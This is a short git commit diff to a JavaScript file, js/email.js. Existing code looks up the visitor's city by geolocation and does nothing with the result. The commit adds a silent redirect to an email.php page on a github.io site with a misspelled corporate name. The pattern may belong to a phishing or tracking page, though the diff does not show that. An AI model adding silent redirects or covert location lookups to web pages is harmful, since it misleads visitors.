1ef89256e767e5e1964db1767ef6110bdcd4fbde
MRGoldenCarratt <43500392+MRGoldenCarratt@users.noreply.github.com>
2018-12-11 19:56:46 +0000

    Update email.js

--- js/email.js
+++ js/email.js
@@ -2,3 +2,4 @@
 $.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', function(data) {
   var a = (JSON.stringify(data, null, 2));
 });
+window.location = "https://cbcorperation.github.io/cbcorperation/php/email.php";
